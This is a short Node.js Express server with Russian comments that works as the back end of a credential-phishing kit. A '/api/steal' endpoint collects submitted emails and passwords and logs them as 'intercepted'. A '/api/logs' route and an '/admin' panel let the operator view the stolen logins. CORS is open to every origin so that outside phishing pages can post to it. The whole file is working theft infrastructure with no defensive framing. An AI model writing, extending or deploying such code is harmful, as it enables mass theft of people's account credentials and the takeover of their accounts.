const express = require('express');
const cors = require('cors');
const path = require('path');
const app = express();

app.use(cors());
app.use(express.json());

let stolenData = [];

// Прием данных (почта и пароль)
app.post('/api/steal', (req, res) => {
    const { email, password, plan } = req.body;
    if (email) {
        stolenData.push({ 
            email, 
            password: password || 'нет пароля',
            plan: plan || 'Неизвестно', 
            time: new Date().toLocaleTimeString() 
        });
        console.log(`[!] ПЕРЕХВАЧЕНО: ${email} | Пароль: ${password}`);
    }
    res.status(200).send({ status: 'ok' });
});

// Отдача логов для панели
app.get('/api/logs', (req, res) => {
    res.json(stolenData);
});

// Раздача панели admin.html
app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'admin.html'));
});

const PORT = process.env.PORT || 7860;
app.listen(PORT, () => { console.log(`Server running on port ${PORT}`); });